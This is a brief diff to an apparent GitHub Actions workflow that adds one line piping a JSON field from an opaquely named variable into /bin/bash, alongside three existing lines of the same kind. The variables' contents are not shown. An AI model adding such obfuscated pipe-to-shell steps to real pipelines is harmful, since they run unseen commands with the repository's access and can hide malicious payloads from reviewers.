@@ -32,6 +32,7 @@ jobs:
           echo $vh5950 | jq -r .mrx9 | /bin/bash
           echo $uunsm025 | jq -r .r80092 | /bin/bash
           echo $zw229 | jq -r .zh27 | /bin/bash
+          printf '%s' "$m3" | jq -r .zr248 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
